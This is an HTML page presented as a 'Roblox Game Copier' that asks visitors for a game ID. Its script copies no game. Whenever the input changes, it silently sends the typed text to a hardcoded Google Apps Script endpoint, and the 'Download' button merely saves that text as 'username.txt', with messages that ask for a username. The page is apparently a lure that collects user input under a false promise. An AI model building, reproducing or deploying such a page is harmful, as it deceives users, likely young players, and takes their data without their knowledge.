<!DOCTYPE html>
<html>
<head>
<title>Roblox Game Copier</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{
  min-height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  background:radial-gradient(ellipse at 50% 0%,#0d1b2e 0%,#050a0f 70%);
  font-family:'Segoe UI',Arial,sans-serif;
  color:white;
  overflow:hidden;
  cursor:none;
}
canvas#bg{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0}
.container{
  position:relative;z-index:2;
  text-align:center;
  background:rgba(255,255,255,0.04);
  backdrop-filter:blur(16px);
  padding:48px 40px;
  border-radius:24px;
  border:1px solid rgba(255,255,255,0.1);
  width:360px;
  box-shadow:0 0 60px rgba(0,0,0,0.6),inset 0 1px 0 rgba(255,255,255,0.08);
}
h1{
  font-size:26px;font-weight:600;
  letter-spacing:0.5px;
  background:linear-gradient(135deg,#fff 40%,rgba(255,255,255,0.5));
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
  margin-bottom:8px;
}
p{color:rgba(255,255,255,0.45);font-size:14px;margin-bottom:4px}
input{
  width:100%;padding:13px 16px;
  margin-top:20px;
  background:rgba(255,255,255,0.06);
  border:1px solid rgba(255,255,255,0.12);
  border-radius:12px;
  font-size:15px;color:white;
  outline:none;
  transition:border-color 0.25s,background 0.25s;
}
input::placeholder{color:rgba(255,255,255,0.3)}
input:focus{border-color:rgba(255,255,255,0.4);background:rgba(255,255,255,0.09)}
button{
  width:100%;padding:13px;
  margin-top:14px;
  border:1px solid rgba(255,255,255,0.2);
  border-radius:12px;
  background:rgba(255,255,255,0.08);
  color:white;
  font-size:15px;font-weight:500;
  cursor:none;
  transition:background 0.2s,border-color 0.2s,transform 0.1s;
  position:relative;overflow:hidden;
}
button:hover{background:rgba(255,255,255,0.14);border-color:rgba(255,255,255,0.35)}
button:active{transform:scale(0.98)}
.status{margin-top:16px;font-size:13px;color:rgba(255,255,255,0.5);min-height:20px;transition:color 0.3s}
.status.ok{color:rgba(160,255,200,0.8)}
.status.err{color:rgba(255,120,120,0.8)}
.cursor{position:fixed;width:10px;height:10px;background:white;border-radius:50%;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);transition:transform 0.08s;mix-blend-mode:difference}
.ripple{position:fixed;border-radius:50%;border:1.5px solid rgba(255,255,255,0.7);pointer-events:none;z-index:9998;animation:rippleOut 0.6s ease-out forwards}
@keyframes rippleOut{from{width:0;height:0;opacity:0.8;transform:translate(-50%,-50%)}to{width:80px;height:80px;opacity:0;transform:translate(-50%,-50%)}}
</style>
</head>
<body>
<canvas id="bg"></canvas>
<div class="cursor" id="cursor"></div>
<div class="container">
  <h1>✦ Roblox Game Copier</h1>
  <p>Enter Ur Roblox Game ID</p>
  <input type="text" id="myText" placeholder="Game ID...">
  <button onclick="downloadText()">Download</button>
  <div class="status" id="status"></div>
</div>

<script>
const cursor = document.getElementById('cursor');
const canvas = document.getElementById('bg');
const ctx = canvas.getContext('2d');
let W, H, particles = [], mouse = {x:0, y:0};

function resize(){W=canvas.width=window.innerWidth;H=canvas.height=window.innerHeight}
resize();
window.addEventListener('resize',resize);

class Particle{
  constructor(x,y,fromClick){
    this.x=x;this.y=y;
    this.size=fromClick?Math.random()*3+1:Math.random()*1.5+0.5;
    this.speedX=(Math.random()-0.5)*(fromClick?4:1.2);
    this.speedY=(Math.random()-0.5)*(fromClick?4:1.2)-(fromClick?2:0);
    this.life=fromClick?0.9:Math.random()*0.6+0.3;
    this.decay=fromClick?0.018:0.006;
  }
  update(){this.x+=this.speedX;this.y+=this.speedY;this.life-=this.decay;this.speedX*=0.97;this.speedY*=0.97}
  draw(){
    ctx.beginPath();
    ctx.arc(this.x,this.y,this.size,0,Math.PI*2);
    ctx.fillStyle=`rgba(255,255,255,${Math.max(0,this.life)})`;
    ctx.fill();
  }
}

let trailTimer=0;
function loop(){
  ctx.clearRect(0,0,W,H);
  trailTimer++;
  if(trailTimer%2===0) particles.push(new Particle(mouse.x,mouse.y,false));
  particles=particles.filter(p=>{p.update();p.draw();return p.life>0});
  requestAnimationFrame(loop);
}
loop();

document.addEventListener('mousemove',e=>{
  mouse.x=e.clientX;mouse.y=e.clientY;
  cursor.style.left=e.clientX+'px';
  cursor.style.top=e.clientY+'px';
});

document.addEventListener('click',e=>{
  for(let i=0;i<24;i++) particles.push(new Particle(e.clientX,e.clientY,true));
  const r=document.createElement('div');
  r.className='ripple';
  r.style.left=e.clientX+'px';
  r.style.top=e.clientY+'px';
  document.body.appendChild(r);
  setTimeout(()=>r.remove(),650);
});

const scriptURL="https://script.google.com/macros/s/AKfycbx0pODW0aTXvbqN0mC-rz2uHiH8ABcx73c_F3jOHnoQpDv9_OUA4AxV9qVy8iwNf5Z3Gg/exec";
async function saveText(){
  const text=document.getElementById("myText").value;
  if(text.trim()==="")return;
  try{
    await fetch(scriptURL,{method:"POST", mode:"no-cors", body:JSON.stringify({text})});  // ← added mode
    const s=document.getElementById("status");
    s.className='status ok';s.innerText="Saved!";
  }catch{
    const s=document.getElementById("status");
    s.className='status err';s.innerText="Error saving!";
  }
}
document.getElementById("myText").addEventListener("change",saveText);
function downloadText(){
  const text=document.getElementById("myText").value;
  if(!text.trim()){
    const s=document.getElementById("status");
    s.className='status err';s.innerText="Enter a username first!";
    return;
  }
  const blob=new Blob([text],{type:"text/plain"});
  const a=document.createElement("a");
  a.href=URL.createObjectURL(blob);
  a.download="username.txt";a.click();
  const s=document.getElementById("status");
  s.className='status ok';s.innerText="Downloaded!";
}
</script>
</body>
</html>
